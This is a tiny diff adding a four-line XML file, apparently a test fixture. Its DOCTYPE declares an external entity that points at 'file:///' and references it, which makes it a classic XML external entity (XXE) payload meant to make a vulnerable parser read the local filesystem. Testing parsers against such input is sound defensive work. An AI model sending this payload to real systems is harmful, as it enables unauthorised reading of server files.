@@ -1,0 +1,4 @@
+<!DOCTYPE xxe [
+<!ENTITY e SYSTEM "file:///">
+]>
+<x>&e;</x>
